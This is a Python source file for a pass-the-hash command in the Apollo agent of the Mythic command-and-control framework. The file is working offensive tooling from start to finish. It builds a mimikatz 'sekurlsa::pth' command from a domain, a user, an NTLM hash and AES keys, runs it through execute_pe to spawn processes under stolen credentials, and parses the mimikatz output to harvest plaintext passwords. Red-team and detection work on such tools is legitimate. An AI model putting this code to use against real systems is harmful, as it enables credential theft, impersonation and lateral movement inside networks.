from operator import truediv
from mythic_container.MythicCommandBase import *
import json
from uuid import uuid4
from apollo.mythic.sRDI import ShellcodeRDI
from os import path
from mythic_container.MythicRPC import *
import base64
import sys

class PthArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="domain",
                cli_name="Domain",
                display_name="Domain", 
                type=ParameterType.String, 
                description="Domain associated with user.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True
                    )
                ]),
            CommandParameter(
                name="user",
                cli_name="User",
                display_name="User", 
                type=ParameterType.String, 
                description="Username associated with the NTLM hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=2,
                        required=True
                    )
                ]),
            CommandParameter(
                name="ntlm",
                cli_name="NTLM",
                display_name="NTLM", 
                type=ParameterType.String, 
                description="User's NTLM hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=3,
                        required=True
                    )
                ]),
            CommandParameter(
                name="aes128",
                cli_name="AES128",
                display_name="AES128", 
                type=ParameterType.String, 
                description="AES128 key of user. Used for over pass the hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=4,
                        required=False
                    )
                ]),
            CommandParameter(
                name="aes256",
                cli_name="AES256",
                display_name="AES256", 
                type=ParameterType.String, 
                description="AES256 key of user. Used for over pass the hash.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=5,
                        required=False
                    )
                ]),
            CommandParameter(
                name="run",
                cli_name="Run",
                display_name="Program to Run", 
                type=ParameterType.String, 
                description="The process to launch under the specified credentials.",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=6,
                        required=False
                    ),
                    ParameterGroupInfo(
                        required=False,
                        group_name="SavedCredentials",
                        ui_position=2
                    )
                ]),
        
            CommandParameter(
                name="credential",
                cli_name="Credential",
                display_name="Credential",
                type=ParameterType.Credential_JSON,
                description="Username and hash of the user to impersonate",
                parameter_group_info=[
                    ParameterGroupInfo(
                        ui_position=1,
                        required=True,
                        group_name="SavedCredentials"
                    )
                ]),
        ]

    async def parse_arguments(self):
        if len(self.command_line) and self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
            username = ""
            domain = ""
            ntlm = ""
            aes128 = self.get_arg("aes128")
            aes256 = self.get_arg("aes256")
            run = self.get_arg("run")
            if self.get_arg("credential"):
                cred = self.get_arg("credential")
                username = cred["account"]
                domain = cred["realm"]
                ntlm = cred["credential"]
            else:
                username = self.get_arg("user")
                domain = self.get_arg("domain")
                ntlm = self.get_arg("ntlm")

            cmd = "sekurlsa::pth /domain:{} /user:{} /ntlm:{}".format(
                domain,
                username,
                ntlm
            )
            if aes128:
                cmd += " /aes128:{}".format(aes128)
            if aes256:
                cmd += " /aes256:{}".format(aes256)
            if run:
                if " " in run:
                    run = "\'{}\'".format(run)
                cmd += " /run:{}".format(run)
            cmd = "\\\"{}\\\"".format(cmd)

            self.add_arg("command", "mimikatz.exe {}".format(cmd))
        else:
            raise Exception("No mimikatz command given to execute.\n\tUsage: {}".format(PthCommand.help_cmd))

async def parse_credentials(task: PTTaskCompletionFunctionMessage) -> PTTaskCompletionFunctionMessageResponse:
    response = PTTaskCompletionFunctionMessageResponse(Success=True, TaskStatus="success", Completed=True)
    responses = await SendMythicRPCResponseSearch(MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID))
    for output in responses.Responses:
        mimikatz_out = str(output.Response)
        comment = "task {}".format(output.TaskID)
        if mimikatz_out != "":
            lines = mimikatz_out.split("\r\n")

            for i in range(len(lines)):
                line = lines[i]
                if "Username" in line:
                    # Check to see if Password is null
                    if i+2 >= len(lines):
                        break
                    uname = line.split(" : ")[1].strip()
                    realm = lines[i+1].split(" : ")[1].strip()
                    passwd = lines[i+2].split(" : ")[1].strip()
                    if passwd != "(null)":
                        cred_resp = await SendMythicRPCCredentialCreate(MythicRPCCredentialCreateMessage(
                            TaskID=task.SubtaskData.Task.ID,
                            Credentials=[MythicRPCCredentialData(
                                credential_type="plaintext",
                                account=uname,
                                realm=realm,
                                credential=passwd,
                                comment=comment
                            )]
                        ))
                        if not cred_resp.Success:
                            raise Exception("Failed to register credential")
    return response


class PthCommand(CommandBase):
    cmd = "pth"
    attributes=CommandAttributes(
        dependencies=["execute_pe"]
    )
    needs_admin = False
    help_cmd = "pth -Domain [domain] -User [user] -NTLM [ntlm] [-AES128 [aes128] -AES256 [aes256] -Run [cmd.exe]]"
    description = "Spawn a new process using the specified domain user's credential material."
    version = 3
    author = "@djhohnstein"
    argument_class = PthArguments
    attackmapping = ["T1550"]
    script_only = True
    completion_functions = {"parse_credentials": parse_credentials}


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCTaskCreateSubtask(MythicRPCTaskCreateSubtaskMessage(
            TaskID=taskData.Task.ID,
            CommandName="execute_pe",
            Params=taskData.args.get_arg("command"),
            SubtaskCallbackFunction="parse_credentials"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
